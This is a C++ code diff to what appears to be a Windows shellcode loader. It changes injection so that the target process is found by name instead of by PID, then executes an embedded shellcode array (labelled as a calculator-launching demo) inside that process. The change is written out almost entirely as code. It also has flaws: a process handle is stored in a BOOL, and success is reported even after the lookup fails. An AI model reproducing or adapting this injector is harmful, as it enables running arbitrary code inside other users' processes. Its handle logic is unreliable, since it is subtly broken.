@@ -1,6 +1,7 @@
 #include "config.hpp"
 #include "typedef.hpp"
 #include "execute.hpp"
+#include "enumeration.hpp"
 
 #ifndef _DEBUG
 #pragma comment(linker, "/ENTRY:entry")
@@ -19,7 +20,18 @@ VOID entry(void)
 		0x34,0xae,0x48,0x01,0xf7,0x99,0xff,0xd7
 	}; // win-exec-calc-shellcode.bin
 
-	ExecuteShellcode(CONFIG_EXECUTION_TARGET_PID, shellcode);
+	BOOL result = FALSE;
+	BOOL process_handle = NULL;
+
+	process_handle = enumeration::GetProcessHandle((LPCWSTR)CONFIG_EXECUTION_TARGET_NAME, NULL, NULL);
+	if (!process_handle)
+	{
+		LOG_ERROR("Error getting process handle.");
+		result = FALSE;
+	}
+
+	ExecuteShellcode((HANDLE)process_handle, shellcode);
+	result = TRUE;
 }
 
 #pragma region [alternate entrypoints]
